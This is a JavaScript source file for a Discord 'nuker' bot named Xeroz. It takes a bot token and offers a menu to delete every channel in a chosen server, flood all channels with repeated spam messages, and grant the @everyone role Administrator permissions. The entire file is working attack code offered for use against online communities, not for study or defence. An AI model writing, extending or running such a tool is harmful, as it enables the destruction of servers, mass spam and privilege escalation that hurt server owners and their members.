console.clear();
// IMPORTS
require("dotenv").config();
const { Client, GatewayIntentBits, DiscordjsError, disableValidators, PermissionsBitField  } = require('discord.js');
const consoleColour = require('gradient-string');
const q = require('readline-sync');
const open = require('open');
const { spawn, exec, execFile } = require('child_process');
const Token = q.question((consoleColour.mind) ("What's your Bot Token? ")); console.clear();


const logo = [`
					db    db d88888b d8888b.  .d88b.  d88888D 
					'8b  d8' 88'     88  '8D .8P  Y8. YP  d8' 
					 '8bd8'  88ooooo 88oobY' 88    88    d8'  
					 .dPYb.  88~~~~~ 88'8b   88    88   d8'   
					.8P  Y8. 88.     88 '88. '8b  d8'  d8' db 
					YP    YP Y88888P 88   YD  'Y88P'  d88888P                                     
`];

// CREATING THE CLIENT
const xeroz = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
	],
});

function MainScreen(){
	console.clear();
	process.title = ` ${xeroz.user.username} | Num Of Guilds: ${xeroz.guilds.cache.size}`;
	console.log((consoleColour.mind)(logo),(consoleColour.mind)`\n\t\t\t\t\t\t\t[1] Nuke\n\t\t\t\t\t\t\t[2] Webhook Spam\n\t\t\t\t\t\t\t[3] Admin All\n`);
}

function sleep(ms) 
{
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function Xeroz(){
console.clear();
	MainScreen();
	let option = q.question((consoleColour.mind) ("[Option] : "));
	//OPTION 1

	if (option == "1") 
	{
		process.title = `${xeroz.user.username} | [1: NUKING]`;
		let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
		const guild = xeroz.guilds.cache.get(GuildID);
		const channels = guild.channels.cache;
	  
		if (!guild) 
		{
		  process.title = `${xeroz.user.username} | [ERROR]`;
		  console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${GuildID} does not exist.`);
		   Xeroz();
		} else 
		{
		  channels.forEach(async channel => 
			{
			console.log(consoleColour.mind("[Deleted] : ") + "Channel" +  channel.name);
			channel.delete();
			await sleep(2500);
			Xeroz();
		 	});
		}
	}

	if (option == "2") 
	{
		  process.title = `${xeroz.user.username} | [2: WEBHOOK SPAM]`;
		  let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
		  let Content = q.question(consoleColour.mind("[Message Content] : "));
		  let Amount = q.question(consoleColour.mind("[Amount of messages] (Bot can get rate limited if too many messages need to be send!): "));
		  const guild = xeroz.guilds.cache.get(GuildID);
		  const channels = guild.channels.cache;
		
		  if (!guild) 
		  {
			process.title = `${xeroz.user.username} | [ERROR]`;
			console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${GuildID} does not exist.`);
			 Xeroz();
		  } else 
		  {
			channels.forEach(async channel => 
			  {
				let i = 0;
				while (i < Amount)
				{
				channel.send(Content);
				console.log(consoleColour.mind(`[${xeroz.user.username} Sent] : `) + `"${Content}" in "${channel.name}"`);
				i++;
				}
				await sleep(1500);
				Xeroz();
			});
		  }
	}

	if (option == "3") 
	{
		process.title = `${xeroz.user.username} | [3: ADMINALL]`;
		let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
		const guild = xeroz.guilds.cache.get(GuildID);
		// const role = guild.roles.cache.find(r => r.name === "@everyone");
	  
		if (!guild) 
		{
		  process.title = `${xeroz.user.username} | [ERROR]`;
		  console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${GuildID} does not exist.`);
		Xeroz();
		} else 
		{

		guild.roles.everyone.setPermissions('Administrator')
		.then(() =>console.log(consoleColour.mind(`[Admin] : `)+ `Role "@everyone" has been given Administrator permissions`))
		.catch(error => {
		console.error(error);
		console.log(consoleColour.mind("[Error] : ") +'An error occurred while setting role permissions');
		});
		await sleep(1500);
		Xeroz()
		}
	}

	else
	{
	console.log((consoleColour.mind)("[Error] : ") + `Option ${option} is Invalid!`);
	await sleep(2500)
	Xeroz();
	}



} 

async function Login(){
	await xeroz.login(Token)
	.catch((error) => {
	console.error((consoleColour.mind)(`[Error] : `) + "Invalid Token:", error.message);
	q.question((consoleColour.mind)(`[!] : `) + "Press ENTER to exit...");
	});
}
xeroz.on("ready", async () => Xeroz());

Login();